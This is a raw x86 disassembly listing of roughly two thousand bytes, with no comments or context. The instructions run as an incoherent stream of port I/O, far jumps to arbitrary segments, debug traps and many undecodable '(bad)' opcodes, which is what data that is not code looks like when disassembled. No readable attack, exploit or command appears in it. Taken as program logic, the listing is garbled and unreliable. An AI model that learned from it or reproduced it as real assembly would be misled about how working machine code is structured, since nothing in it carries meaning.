  416d6e:	imul   BYTE PTR [eax]
  416d70:	dec    ebx
  416d71:	in     eax,0x74
  416d73:	fs jmp 0x6e0ea5e7
  416d79:	cld    
  416d7a:	sbb    DWORD PTR [ecx],0xffffffc4
  416d7d:	xlat   BYTE PTR ds:[ebx]
  416d7e:	jecxz  0x416d68
  416d80:	sbb    DWORD PTR [edx],eax
  416d82:	mov    al,0xcf
  416d84:	fadd   QWORD PTR [edi-0x229f29c9]
  416d8a:	icebp  
  416d8b:	fnstenv [esi]
  416d8d:	hlt    
  416d8e:	mov    esi,0xb31f210b
  416d93:	sahf   
  416d94:	adc    eax,0x4efd85f0
  416d99:	mov    cl,0xe6
  416d9b:	call   0x6866:0xf49a1d5b
  416da2:	add    bh,dh
  416da4:	and    DWORD PTR ds:0x8fef25e,esi
  416daa:	mov    dh,0xbd
  416dac:	xchg   dh,cl
  416dae:	(bad)  
  416daf:	cli    
  416db0:	jecxz  0x416e1f
  416db2:	mov    bl,0x9b
  416db4:	jnp    0x416da6
  416db6:	or     dl,BYTE PTR [ecx-0x59c62bfb]
  416dbc:	lock std 
  416dbe:	leave  
  416dbf:	mov    dl,0x72
  416dc1:	jecxz  0x416de7
  416dc3:	xchg   bl,dh
  416dc5:	out    dx,eax
  416dc6:	stos   DWORD PTR es:[edi],eax
  416dc7:	daa    
  416dc8:	xlat   BYTE PTR ds:[ebx]
  416dc9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416dca:	cmp    al,0xa1
  416dcc:	idiv   BYTE PTR [ecx+0x57]
  416dcf:	popf   
  416dd0:	bound  ecx,QWORD PTR [ebx-0x4c]
  416dd3:	push   0xffffffca
  416dd5:	fwait
  416dd6:	mov    esp,DWORD PTR [eax+0x1da98584]
  416ddc:	call   0x769a7518
  416de1:	push   ds
  416de2:	pop    eax
  416de3:	test   BYTE PTR fs:[edi+0x7b],ch
  416de7:	inc    ebx
  416de8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416de9:	ror    DWORD PTR [edx-0x4b],cl
  416dec:	xchg   esi,eax
  416ded:	imul   BYTE PTR [ecx+0x57025d73]
  416df3:	out    dx,al
  416df4:	div    esp
  416df6:	pop    ecx
  416df7:	or     esi,DWORD PTR [edi]
  416df9:	out    dx,eax
  416dfa:	mov    ch,0x83
  416dfc:	or     bh,dh
  416dfe:	cmp    dl,BYTE PTR [bp-0x48]
  416e02:	inc    ebp
  416e03:	sub    esp,DWORD PTR [esi-0x36]
  416e06:	mov    bl,0x55
  416e08:	leave  
  416e09:	leave  
  416e0a:	rcl    ebx,1
  416e0c:	(bad)  
  416e0d:	gs jne 0x416e36
  416e10:	fs push eax
  416e12:	sbb    BYTE PTR [eax+0x3ed2943e],0x93
  416e19:	jecxz  0x416deb
  416e1b:	dec    esp
  416e1c:	in     al,0xa5
  416e1e:	push   es
  416e1f:	repz repnz shl bl,1
  416e23:	jg     0x416e1f
  416e25:	in     eax,0xbc
  416e27:	shl    BYTE PTR [ebx],1
  416e29:	mov    dh,0xf9
  416e2b:	stos   DWORD PTR es:[edi],eax
  416e2c:	xchg   ebx,eax
  416e2d:	push   esi
  416e2e:	push   cs
  416e2f:	int3   
  416e30:	xchg   edx,eax
  416e31:	push   0xca9381d8
  416e36:	fimul  DWORD PTR [ebp+0x52]
  416e39:	push   0x25
  416e3b:	daa    
  416e3c:	mov    bl,0xaa
  416e3e:	fstp   DWORD PTR [ecx+eax*2]
  416e41:	push   esp
  416e42:	ror    DWORD PTR [ecx],0x35
  416e45:	dec    ebp
  416e46:	and    ebx,DWORD PTR ds:0xeae1e8ee
  416e4c:	adc    bl,dh
  416e4e:	lods   eax,DWORD PTR ds:[esi]
  416e4f:	into   
  416e50:	inc    esp
  416e51:	fcomp  DWORD PTR [ebx]
  416e53:	shl    ch,0xbf
  416e56:	test   dl,dl
  416e58:	cs or  ebx,esp
  416e5b:	(bad)  
  416e5c:	bound  ecx,QWORD PTR [edi]
  416e5e:	sar    DWORD PTR [ebp+0x6daefa45],0x49
  416e65:	push   edi
  416e66:	aad    0x68
  416e68:	fwait
  416e69:	jae    0x416ecb
  416e6b:	shl    DWORD PTR [eax+0x3c],0x6d
  416e6f:	adc    esp,DWORD PTR [eax+ecx*2-0x642c65a]
  416e76:	fdiv   QWORD PTR [ebp+0x6b]
  416e79:	or     BYTE PTR [ebx],bl
  416e7b:	leave  
  416e7c:	xchg   esp,edi
  416e7e:	mov    esp,0x544f41f4
  416e83:	inc    esp
  416e84:	ret    0xe32f
  416e87:	and    al,0x34
  416e89:	pop    ds
  416e8a:	std    
  416e8b:	aad    0x5e
  416e8d:	jb     0x416e43
  416e8f:	sub    cl,ah
  416e91:	pop    DWORD PTR [ecx-0x47]
  416e94:	ficomp DWORD PTR [edx+0x57]
  416e97:	push   eax
  416e98:	inc    esp
  416e99:	ds pop ecx
  416e9b:	ret    
  416e9c:	sbb    cl,dl
  416e9e:	fcmovu st,st(7)
  416ea0:	(bad)  [esi]
  416ea2:	mov    al,ds:0xf1b1f87d
  416ea7:	clc    
  416ea8:	mov    ebp,0xa5edeb77
  416ead:	xchg   ebp,eax
  416eae:	add    al,0xb0
  416eb0:	daa    
  416eb1:	stos   BYTE PTR es:[edi],al
  416eb2:	pandn  mm7,mm6
  416eb5:	repz lock jae 0x416ea4
  416eb9:	cmp    eax,0xc70fc00
  416ebe:	push   es
  416ebf:	test   al,0x5d
  416ec1:	sub    eax,0x145f14c5
  416ec6:	and    BYTE PTR [edx+0x5d],0xb2
  416eca:	push   eax
  416ecb:	fldenv gs:[edx+0x56]
  416ecf:	pop    edi
  416ed0:	leave  
  416ed1:	out    dx,eax
  416ed2:	push   ds
  416ed3:	imul   ebx,DWORD PTR [ebx-0x36],0xc79f0721
  416eda:	inc    ecx
  416edb:	cmp    ebx,DWORD PTR [eax+0x65cadcca]
  416ee1:	je     0x416e94
  416ee3:	nop
  416ee4:	mov    esp,0xde4732d8
  416ee9:	push   eax
  416eea:	jnp    0x416ea2
  416eec:	pop    es
  416eed:	push   esi
  416eee:	aaa    
  416eef:	outs   dx,DWORD PTR ds:[esi]
  416ef0:	stos   BYTE PTR es:[edi],al
  416ef1:	dec    edx
  416ef2:	pusha  
  416ef3:	mov    dl,BYTE PTR [edx+0x4b7120de]
  416ef9:	inc    ebp
  416efa:	mov    DWORD PTR [esi-0x1e],esp
  416efd:	nop
  416efe:	dec    ecx
  416eff:	push   ebp
  416f00:	icebp  
  416f01:	add    dh,BYTE PTR [ebx+0x2f]
  416f04:	sub    BYTE PTR [esi-0x3b5d44d9],bh
  416f0a:	jmp    0xa135b641
  416f0f:	jnp    0x416ed3
  416f11:	call   0xdd982eea
  416f16:	(bad)
  416f19:	sub    ecx,esi
  416f1b:	jle    0x416f19
  416f1d:	les    ebx,FWORD PTR [ebx]
  416f1f:	and    al,0x30
  416f21:	pop    edi
  416f22:	les    ebp,FWORD PTR [esp+ebx*2-0x4a]
  416f26:	adc    esp,ebp
  416f28:	inc    ebp
  416f29:	xchg   ecx,eax
  416f2a:	mov    ah,0x28
  416f2c:	(bad)  [edi]
  416f2e:	idiv   ebp
  416f30:	and    BYTE PTR [ebp+0x2f],ah
  416f33:	mov    DWORD PTR [eax-0x60],ebx
  416f36:	sbb    edi,DWORD PTR ds:0x85b306ca
  416f3c:	in     al,dx
  416f3d:	xchg   ebx,eax
  416f3e:	fbstp  TBYTE PTR [ecx-0x74]
  416f41:	pusha  
  416f42:	stos   BYTE PTR es:[edi],al
  416f43:	mov    al,BYTE PTR [edi]
  416f45:	inc    edx
  416f46:	mov    DWORD PTR [edx-0x6bd4fb3d],eax
  416f4c:	add    ebx,edx
  416f4e:	pop    ebx
  416f4f:	dec    DWORD PTR [edx-0x70]
  416f52:	cs jmp 0x9451:0x6ce2bd0b
  416f5a:	adc    edi,edx
  416f5c:	cmp    ebx,DWORD PTR [edi+0x2101a326]
  416f62:	dec    edx
  416f63:	pop    es
  416f64:	dec    eax
  416f65:	xor    BYTE PTR ds:0x266f05a6,bl
  416f6b:	adc    al,0xa
  416f6d:	adc    ebx,DWORD PTR [edi+0x58]
  416f70:	call   0x6cb7:0xa5b13b68
  416f77:	cwde   
  416f78:	popf   
  416f79:	(bad)  
  416f7a:	in     eax,dx
  416f7b:	jno    0x416f20
  416f7d:	repz enter 0xafdf,0xf9
  416f82:	test   BYTE PTR [ebx-0x67baf9c7],dh
  416f88:	cmp    dl,BYTE PTR [eax+0x5c5aac50]
  416f8e:	dec    ebx
  416f8f:	mov    al,ch
  416f91:	inc    esi
  416f92:	push   edi
  416f93:	ret    0x951d
  416f96:	inc    ecx
  416f97:	push   0xa65eae1f
  416f9c:	mov    ebp,0x7ed3401d
  416fa1:	outs   dx,BYTE PTR ds:[esi]
  416fa2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416fa3:	aaa    
  416fa4:	aas    
  416fa5:	aas    
  416fa6:	and    eax,0x28b0ef14
  416fab:	bound  esp,QWORD PTR [eax]
  416fad:	lds    ebp,FWORD PTR [edx+0x2b]
  416fb0:	jb     0x416f59
  416fb2:	ror    BYTE PTR [edi-0x1d2b0b7d],0xc6
  416fb9:	adc    dl,0xb
  416fbc:	push   esp
  416fbd:	inc    edi
  416fbe:	add    cl,dh
  416fc0:	je     0x417012
  416fc2:	scas   al,BYTE PTR es:[edi]
  416fc3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416fc4:	xchg   edx,eax
  416fc5:	xchg   edx,eax
  416fc6:	stos   DWORD PTR es:[edi],eax
  416fc7:	out    dx,al
  416fc8:	popa   
  416fc9:	fisttp DWORD PTR [edx+0x19]
  416fcc:	and    eax,0x7ebd6986
  416fd1:	das    
  416fd2:	icebp  
  416fd3:	lods   al,BYTE PTR ds:[esi]
  416fd4:	or     esp,edi
  416fd6:	rol    BYTE PTR [eax-0x12750b9b],0xf
  416fdd:	in     eax,dx
  416fde:	icebp  
  416fdf:	out    dx,al
  416fe0:	dec    edi
  416fe1:	push   ds
  416fe2:	push   esi
  416fe3:	or     DWORD PTR [eax+edi*4+0x29],ecx
  416fe7:	sbb    BYTE PTR [ebx],ch
  416fe9:	adc    BYTE PTR [edi+0x55],al
  416fec:	jl     0x417011
  416fee:	pusha  
  416fef:	aas    
  416ff0:	loop   0x41706e
  416ff2:	pop    es
  416ff3:	aas    
  416ff4:	xchg   edx,eax
  416ff5:	cwde   
  416ff6:	and    ebx,0xffffffb8
  416ff9:	jb     0x417037
  416ffb:	jle    0x416f85
  416ffd:	or     al,0xd7
  416fff:	adc    dh,ch
  417001:	out    dx,eax
  417002:	pop    edx
  417003:	popf   
  417004:	outs   dx,DWORD PTR ds:[esi]
  417005:	mov    edi,0xe18556a0
  41700a:	push   eax
  41700b:	mov    edx,0xf761a61f
  417010:	or     ecx,0xffffffa2
  417013:	pop    eax
  417014:	mov    ah,0xbb
  417016:	(bad)  
  417017:	nop
  417018:	sbb    DWORD PTR [edi+eiz*1+0x58bb3567],ecx
  41701f:	cmp    BYTE PTR [esi+0x7e],ah
  417022:	push   ebx
  417023:	aad    0x8d
  417025:	test   DWORD PTR [edi+0x4c2a830],esp
  41702b:	and    al,BYTE PTR [ebp+0x69]
  41702e:	sar    DWORD PTR [esi+0x1dd7bbcd],cl
  417034:	in     eax,dx
  417035:	loop   0x416fcb
  417037:	jmp    0xfdd6fd69
  41703c:	jmp    0x17db0bdf
  417041:	call   0x6985000f
  417046:	xor    ebp,edx
  417048:	shr    BYTE PTR [edi+0x4ffced21],cl
  41704e:	popf   
  41704f:	test   al,0x91
  417051:	arpl   WORD PTR [eax],ax
  417053:	mov    bh,BYTE PTR [ecx+0x75]
  417056:	mov    DWORD PTR [eax],ebx
  417058:	sbb    bh,BYTE PTR [edx]
  41705a:	xor    eax,DWORD PTR [edx]
  41705c:	push   eax
  41705d:	in     eax,dx
  41705e:	adc    eax,0x84c424fb
  417063:	or     BYTE PTR [edi],al
  417065:	pop    ebp
  417066:	jnp    0x417012
  417068:	jnp    0x417014
  41706a:	jg     0x41702e
  41706c:	push   cs
  41706d:	jbe    0x417068
  41706f:	je     0x41702d
  417071:	cmp    bh,BYTE PTR [ebx+0x428bb283]
  417077:	inc    edx
  417078:	test   eax,0x104dda2f
  41707d:	cmp    eax,0xa9d42b06
  417082:	cwde   
  417083:	sahf   
  417084:	es dec ecx
  417086:	push   0x32
  417088:	push   0x91a6b406
  41708d:	in     al,dx
  41708e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41708f:	jp     0x41702c
  417091:	push   esp
  417092:	pop    ecx
  417093:	cmp    eax,0x9a2a92c5
  417098:	add    dh,BYTE PTR [edx-0x16726be0]
  41709e:	idiv   BYTE PTR [eax+0x60]
  4170a1:	jb     0x417050
  4170a3:	mov    eax,DWORD PTR [ecx+edi*4]
  4170a6:	out    dx,al
  4170a7:	je     0x4170b4
  4170a9:	shl    DWORD PTR [esi],1
  4170ab:	stos   DWORD PTR es:[edi],eax
  4170ac:	adc    bl,BYTE PTR [eax+0x44]
  4170af:	imul   ebp,DWORD PTR [ebp+0x27fdc99],0x7a6c4586
  4170b9:	(bad)  
  4170ba:	out    0x85,al
  4170bc:	mov    ds:0xf431f9de,al
  4170c1:	bound  eax,QWORD PTR [edx+0x57]
  4170c4:	mov    ah,0xcf
  4170c6:	mov    dl,0xe0
  4170c8:	jmp    0x9795:0x41803408
  4170cf:	call   0xea792afd
  4170d4:	in     al,dx
  4170d5:	push   ds
  4170d6:	rcr    BYTE PTR [esi+0x31],0x20
  4170da:	dec    eax
  4170db:	lahf   
  4170dc:	dec    ebx
  4170dd:	jno    0x41713c
  4170df:	daa    
  4170e0:	ja     0x41712b
  4170e2:	and    eax,0xa02c7e22
  4170e7:	rol    BYTE PTR [ebp+0x51b7766f],cl
  4170ed:	ret    
  4170ee:	dec    eax
  4170ef:	pop    ebp
  4170f0:	jns    0x417105
  4170f2:	cs out dx,eax
  4170f4:	stc    
  4170f5:	jo     0x4170b3
  4170f7:	outs   dx,BYTE PTR ds:[esi]
  4170f8:	bound  eax,QWORD PTR [esi+0x7d11ffd6]
  4170fe:	jae    0x41715a
  417100:	jp     0x4170e7
  417102:	not    ah
  417104:	and    DWORD PTR [ebx],ecx
  417106:	sbb    esi,ecx
  417108:	add    DWORD PTR [eax],esp
  41710a:	cmp    BYTE PTR [ebp+0x25],ch
  41710d:	in     al,dx
  41710e:	pop    edx
  41710f:	mov    ds:0xf5902868,al
  417114:	out    dx,al
  417115:	adc    eax,0x5416d5f2
  41711a:	sbb    eax,0xaee36e1
  41711f:	sbb    al,0x8a
  417121:	jno    0x41713a
  417123:	cmp    DWORD PTR [esi+0x1efa9ae5],ebx
  417129:	mov    edi,0xc5ed2f91
  41712e:	push   ebp
  41712f:	push   es
  417130:	inc    ebp
  417131:	(bad)  
  417133:	pop    eax
  417134:	les    edx,FWORD PTR [edx]
  417136:	pop    ss
  417137:	push   0xffffffa6
  417139:	xor    dh,cl
  41713b:	pop    edi
  41713c:	rcl    ch,1
  41713e:	arpl   si,dx
  417140:	shl    BYTE PTR [eax+ebx*2],cl
  417143:	jmp    0x979c7415
  417148:	mov    ds:0x127401a2,eax
  41714d:	clc    
  41714e:	pop    esp
  41714f:	sub    ecx,DWORD PTR [esi]
  417151:	adc    edx,DWORD PTR ds:[esi]
  417154:	xor    eax,0xf6378d04
  417159:	out    0xc4,al
  41715b:	icebp  
  41715c:	cmp    edi,DWORD PTR [esi+edx*4+0x39]
  417160:	fmul   DWORD PTR [esi+0x62a46671]
  417166:	outs   dx,BYTE PTR ds:[esi]
  417167:	jge    0x4170f9
  417169:	clc    
  41716a:	sbb    al,0x69
  41716c:	sub    DWORD PTR [esi+0x5981ecc5],ecx
  417172:	sbb    ah,BYTE PTR [edi+ebp*2-0x5b]
  417176:	push   edi
  417177:	mov    ecx,0x3e5aabee
  41717c:	in     eax,dx
  41717d:	das    
  41717e:	mov    al,ds:0x870cdeef
  417183:	cld    
  417184:	out    dx,al
  417185:	mov    ds:0xd2090909,eax
  41718a:	add    eax,0x33437ee2
  41718f:	pop    edx
  417190:	cmp    cl,BYTE PTR [edi+edx*8]
  417193:	in     al,dx
  417194:	cld    
  417195:	sbb    ecx,DWORD PTR gs:[edi]
  417198:	push   edx
  417199:	retf   
  41719a:	sbb    DWORD PTR [eax+edx*4+0x45],edi
  41719e:	jl     0x4171fa
  4171a0:	aad    0x22
  4171a2:	xchg   dh,ch
  4171a4:	aam    0x2d
  4171a6:	popf   
  4171a7:	and    DWORD PTR [edi+ecx*2-0x33],edi
  4171ab:	sbb    al,0xba
  4171ad:	sub    edx,DWORD PTR [ecx-0xcebc96b]
  4171b3:	jecxz  0x41716f
  4171b5:	mov    dh,BYTE PTR [ebx+0x55]
  4171b8:	push   edi
  4171b9:	and    al,0x44
  4171bb:	je     0x417146
  4171bd:	scas   al,BYTE PTR es:[edi]
  4171be:	cmp    edi,edi
  4171c0:	xchg   DWORD PTR [esi+eiz*1+0x7],esp
  4171c4:	call   0x413e32f0
  4171c9:	lahf   
  4171ca:	jge    0x4171bd
  4171cc:	push   edx
  4171cd:	(bad)  
  4171ce:	fcmove st,st(5)
  4171d0:	and    ecx,DWORD PTR [eax+0x3]
  4171d3:	mov    ds:0x4bc092a5,al
  4171d8:	imul   eax,DWORD PTR [eax+0x72077c7],0x99820c43
  4171e2:	add    dl,dl
  4171e4:	imul   edi,DWORD PTR [ebp+0x2a],0xffffffac
  4171e8:	test   al,0xec
  4171ea:	adc    DWORD PTR [esi-0x7b],ebx
  4171ed:	xor    ecx,ebp
  4171ef:	enter  0x991d,0x33
  4171f3:	adc    eax,0x1e31b4f4
  4171f8:	pop    edi
  4171f9:	(bad)  
  4171fb:	out    0xb6,al
  4171fd:	shl    DWORD PTR [ebx],1
  4171ff:	lea    ebp,[ebx+ecx*8]
  417202:	mov    bl,0x73
  417204:	cmp    DWORD PTR [ebx+0x3d84c5d3],0xffffffc5
  41720b:	iret   
  41720c:	ins    DWORD PTR es:[edi],dx
  41720d:	ins    DWORD PTR es:[edi],dx
  41720e:	push   cs
  41720f:	js     0x4171d5
  417211:	mov    dl,0xdc
  417213:	lahf   
  417214:	cld    
  417215:	(bad)  
  417216:	or     ebx,ecx
  417218:	clc    
  417219:	and    BYTE PTR [ecx-0x1f],ah
  41721c:	push   0xffffff80
  41721e:	inc    esp
  41721f:	call   0x8d078f0a
  417224:	mov    edx,0x164b060c
  417229:	lea    ebp,[edi+0x458dbc5f]
  41722f:	in     al,0x87
  417231:	or     DWORD PTR [edx+0x2a],esp
  417234:	xchg   ebp,eax
  417235:	dec    eax
  417236:	mov    eax,0x270cd1dc
  41723b:	sbb    eax,0x4cc4318d
  417240:	sbb    DWORD PTR [esi+0x54],esp
  417243:	das    
  417244:	mov    dl,0x72
  417246:	fild   DWORD PTR [edx+ebp*4-0x2]
  41724a:	or     al,0xe1
  41724c:	daa    
  41724d:	sar    BYTE PTR [ecx],cl
  41724f:	pop    ss
  417250:	adc    cl,ch
  417252:	sub    ebx,DWORD PTR [esi+ebp*4-0x5]
  417256:	pushf  
  417257:	mov    al,ds:0x33fbac7b
  41725c:	xchg   ebx,eax
  41725d:	mov    eax,DWORD PTR [ebx-0x62]
  417260:	clc    
  417261:	pop    ds
  417262:	cmp    ecx,eax
  417264:	sti    
  417265:	inc    esp
  417266:	int3   
  417267:	outs   dx,BYTE PTR ds:[esi]
  417268:	fld    QWORD PTR [edx]
  41726a:	push   esi
  41726b:	out    0x57,al
  41726d:	add    eax,0x32ea1127
  417272:	test   eax,0xe9f8db05
  417277:	gs mov edi,0x99f9e3c0
  41727d:	xchg   ebx,eax
  41727e:	push   ebx
  41727f:	mov    ch,0x6e
  417281:	fdivr  QWORD PTR [eax+0xe]
  417284:	mov    esp,0x13972788
  417289:	rcr    BYTE PTR [ebx+eax*1+0x34],0x2b
  41728e:	and    eax,0xf83f25d6
  417293:	shr    DWORD PTR [edi],0xe8
  417296:	jmp    0x417283
  417298:	sub    ah,BYTE PTR [edi-0x44]
  41729b:	push   ecx
  41729c:	ins    BYTE PTR es:[edi],dx
  41729d:	fist   DWORD PTR [ebx]
  41729f:	sub    al,0x97
  4172a1:	mov    edi,DWORD PTR [esi-0x59]
  4172a4:	sub    eax,0x7576d7b4
  4172a9:	jns    0x417329
  4172ab:	inc    edx
  4172ac:	cmp    eax,0xfdb166ea
  4172b1:	scas   eax,DWORD PTR es:[edi]
  4172b2:	inc    esp
  4172b3:	int3   
  4172b4:	outs   dx,BYTE PTR ds:[esi]
  4172b5:	les    edx,FWORD PTR [ebx-0xe]
  4172b8:	sub    al,0x83
  4172ba:	(bad)  
  4172bb:	rol    BYTE PTR ds:0xcb4be9e6,0x6d
  4172c2:	mov    ch,0x8e
  4172c4:	and    bl,BYTE PTR [esi-0x5e]
  4172c7:	add    bl,BYTE PTR [esi+0x1]
  4172ca:	lock jg 0x41729c
  4172cd:	pop    ds
  4172ce:	outs   dx,BYTE PTR ds:[esi]
  4172cf:	dec    ebp
  4172d0:	lea    edi,[edx]
  4172d2:	sbb    DWORD PTR [ecx-0x10810dec],edx
  4172d8:	push   esi
  4172d9:	rcr    DWORD PTR ds:0xd6f8fe9b,0x5d
  4172e0:	in     eax,dx
  4172e1:	pop    es
  4172e2:	pop    ebx
  4172e3:	pushf  
  4172e4:	pop    ecx
  4172e5:	push   edi
  4172e6:	add    cl,bl
  4172e8:	in     al,dx
  4172e9:	sub    eax,0xbf7fe163
  4172ee:	adc    dl,ch
  4172f0:	mov    ch,0x27
  4172f3:	outs   dx,BYTE PTR ds:[esi]
  4172f4:	and    al,0xd
  4172f6:	dec    edx
  4172f7:	push   ebp
  4172f8:	sub    DWORD PTR [edx-0x512a41a7],eax
  4172fe:	mov    dh,0xb7
  417300:	or     esp,esi
  417302:	pop    ebp
  417303:	loopne 0x41737c
  417305:	out    0x7,eax
  417307:	fwait
  417308:	imul   ebp,DWORD PTR [eax-0x37],0x1e8eee17
  41730f:	mov    ds:0x51961662,al
  417314:	pop    ebx
  417315:	push   ebp
  417316:	fsubr  QWORD PTR [edi-0x7d]
  417319:	jne    0x4172f3
  41731b:	mov    ds:0xb8f79adb,eax
  417320:	pop    ds
  417321:	push   edi
  417322:	dec    eax
  417323:	in     al,0x16
  417325:	push   ds
  417326:	mov    ecx,0x6750f7df
  41732b:	xor    al,0xa4
  41732d:	(bad)  
  41732e:	out    dx,eax
  41732f:	push   edx
  417330:	int3   
  417331:	dec    esp
  417332:	mov    ebp,0x85eeeca0
  417337:	imul   edx,DWORD PTR [esi],0x3fb26821
  41733d:	(bad)  [eax-0x1a9e21b8]
  417343:	cld    
  417344:	xchg   ebp,edx
  417346:	scas   al,BYTE PTR es:[edi]
  417347:	add    DWORD PTR [ebp-0x1a],ecx
  41734a:	dec    esp
  41734b:	inc    esp
  41734c:	mov    esi,0xb7510a57
  417351:	dec    ebp
  417352:	neg    ebx
  417354:	or     esp,edx
  417356:	adc    ch,BYTE PTR [edi-0x6876fae3]
  41735c:	int    0x68
  41735e:	sub    ebx,DWORD PTR [ecx-0x5e]
  417361:	rcl    DWORD PTR [ecx+0x68],1
  417364:	push   ecx
  417365:	mov    ch,0x9c
  417367:	in     eax,0xf3
  417369:	and    BYTE PTR [eax+0x7d3ae241],dh
  41736f:	jge    0x4173f0
  417371:	test   DWORD PTR [ebx+0x2b92b70f],esp
  417377:	xchg   edx,eax
  417378:	mov    ch,0x8a
  41737a:	sbb    dl,ch
  41737c:	xor    bl,BYTE PTR [edx+0x71]
  41737f:	mov    bh,0x86
  417381:	lods   al,BYTE PTR ds:[esi]
  417382:	and    ch,bh
  417384:	cmp    al,0xf0
  417386:	cdq    
  417387:	add    dl,BYTE PTR [edx+0x108995fa]
  41738d:	adc    BYTE PTR [edi],cl
  41738f:	mov    esi,0x81e4a379
  417394:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417395:	xchg   edx,eax
  417396:	call   0xfdd4367a
  41739b:	loop   0x4173fc
  41739d:	neg    esp
  41739f:	js     0x4173c3
  4173a1:	imul   esi,DWORD PTR [eax],0xffb1621
  4173a7:	inc    esi
  4173a8:	fcomp  QWORD PTR [ebx+0x30]
  4173ab:	cmc    
  4173ac:	cli    
  4173ad:	stc    
  4173ae:	cmp    BYTE PTR [edx],0x38
  4173b1:	ret    0x17e1
  4173b4:	(bad)  
  4173b6:	mov    edx,0x8bbb40c4
  4173bb:	retf   
  4173bc:	stos   DWORD PTR es:[edi],eax
  4173bd:	mov    cl,0xc5
  4173bf:	sub    eax,0x1295be6e
  4173c4:	cdq    
  4173c5:	rep stos BYTE PTR es:[edi],al
  4173c7:	(bad)  
  4173c8:	lock push ecx
  4173ca:	mov    dh,0x67
  4173cc:	xchg   esi,eax
  4173cd:	xor    al,0x8e
  4173cf:	inc    eax
  4173d0:	dec    ebx
  4173d1:	ja     0x4173ac
  4173d3:	out    dx,al
  4173d4:	fwait
  4173d5:	(bad)
  4173d8:	cmc    
  4173d9:	gs repz clc 
  4173dc:	cld    
  4173dd:	icebp  
  4173de:	mov    eax,0xb921b882
  4173e3:	mov    edi,0x5b8e3f12
  4173e8:	test   BYTE PTR [edx+eax*4],0x89
  4173ec:	adc    DWORD PTR [edx],ebp
  4173ee:	adc    eax,0x534bd634
  4173f3:	or     al,0x91
  4173f5:	xchg   ebx,eax
  4173f6:	mov    ch,0x65
  4173f8:	in     al,0x24
  4173fa:	mov    eax,0xbd6836c2
  4173ff:	push   cs
  417400:	jmp    0x41747d
  417402:	dec    ebp
  417403:	test   al,0xd7
  417405:	mov    al,0x2c
  417407:	pop    ds
  417408:	sbb    DWORD PTR [ebx-0x17241638],ebx
  41740e:	gs retf 0x5043
  417412:	xor    ecx,0x68c50e45
  417418:	mov    ecx,0x1ddd1683
  41741d:	or     DWORD PTR [esi-0x3b],esp
  417420:	in     al,0x67
  417422:	out    dx,eax
  417423:	or     BYTE PTR [ecx],ah
  417425:	lds    edx,FWORD PTR [eax]
  417427:	imul   edx,DWORD PTR [ecx],0x9567681
  41742d:	shl    BYTE PTR [esi+0x4ae9d35f],0x6
  417434:	cwde   
  417435:	cmp    BYTE PTR [edi+0x66420a8],al
  41743b:	sub    BYTE PTR [ebx-0x61f2061b],dh
  417441:	lods   eax,DWORD PTR ds:[esi]
  417442:	jmp    0xfbc1:0x51b23d5d
  417449:	mov    al,0xb2
  41744b:	iret   
  41744c:	push   ebp
  41744d:	xor    eax,0x2d5011d7
  417452:	leave  
  417453:	mov    ah,0xcd
  417455:	aaa    
  417456:	dec    esi
  417457:	imul   esp,DWORD PTR [esp+edx*2+0x66358fbc],0xe38d5409
  417462:	and    eax,0x873fd883
  417467:	xlat   BYTE PTR ds:[ebx]
  417468:	lea    ecx,[edx]
  41746a:	push   ebx
  41746b:	test   al,0x54
  41746d:	inc    esi
  41746e:	fstp   DWORD PTR [ecx-0x73bda17]
  417474:	je     0x41748b
  417476:	icebp  
  417477:	mov    ds:0xceb2ad58,al
  41747c:	xor    dl,cl
  41747e:	mov    edi,0xa22442d6
  417483:	dec    ebx
  417484:	adc    eax,0xbe2f40c2
  417489:	xchg   esp,eax
  41748a:	fstp   DWORD PTR [eax]
  41748c:	aas    
  41748d:	push   cs
  41748e:	(bad)  
  41748f:	mov    ?,ebx
  417491:	cmp    ah,BYTE PTR [edi+0x3b]
  417494:	cdq    
  417495:	inc    eax
  417496:	push   ecx
  417497:	in     al,dx
  417498:	mov    dh,0x3d
  41749a:	(bad)  
  41749b:	cmp    eax,0xacf1cc92
  4174a0:	dec    ebx
  4174a1:	cmp    BYTE PTR [ebx],dl
  4174a3:	punpckhwd mm4,QWORD PTR [ebp+0x477999b9]
  4174aa:	addr16 sahf 
  4174ac:	mov    ebp,0x4b5c3878
  4174b1:	jmp    0xe284:0x387c22c7
  4174b8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4174b9:	jle    0x4174cc
  4174bb:	mov    ecx,0x3947b025
  4174c0:	mov    esi,DWORD PTR [ebx]
  4174c2:	in     al,dx
  4174c3:	sti    
  4174c4:	loop   0x417451
  4174c6:	push   ss
  4174c7:	outs   dx,DWORD PTR ds:[esi]
  4174c8:	pusha  
  4174c9:	mov    edi,0xef9c248
  4174ce:	stos   DWORD PTR es:[edi],eax
  4174cf:	ds sbb eax,0xf810b14a
  4174d5:	(bad)  
  4174d6:	iret   
  4174d7:	or     cl,BYTE PTR [eax-0x32]
  4174da:	push   es
  4174db:	lahf   
  4174dc:	bound  ecx,QWORD PTR [ecx-0x36ecd77f]
  4174e2:	dec    edx
  4174e3:	imul   BYTE PTR [ebp-0x3de28ccd]
  4174e9:	pop    ebx
  4174ea:	xchg   edx,eax
  4174eb:	pusha  
  4174ec:	sbb    edi,DWORD PTR [edx]
  4174ee:	mov    al,ds:0x4ea5cb11
  4174f3:	iret   
  4174f4:	sahf   
  4174f5:	xchg   BYTE PTR [ecx-0x60f79c9],cl
  4174fb:	not    BYTE PTR [edi+0x54]
  4174fe:	int    0x28
  417500:	lock push ebx
  417502:	mov    esp,0x3fb9aa6
  417507:	shl    DWORD PTR [eax-0x5d],0x23
  41750b:	inc    ebx
  41750c:	jmp    DWORD PTR [ecx+eiz*8-0x43]
  417510:	pop    ds
  417511:	loope  0x4174df
  417513:	jmp    FWORD PTR [edi-0x5d]
  417516:	jo     0x417530
  417518:	jae    0x4174f1
  41751a:	lds    ecx,FWORD PTR [eax-0x14]
  41751d:	adc    BYTE PTR [esp+ebp*1-0x31],0x53
  417522:	inc    esp
  417523:	iret   
  417524:	or     eax,0x3a1696bd
  417529:	pop    edx
  41752a:	rol    DWORD PTR [ecx+0x956e5d4],1
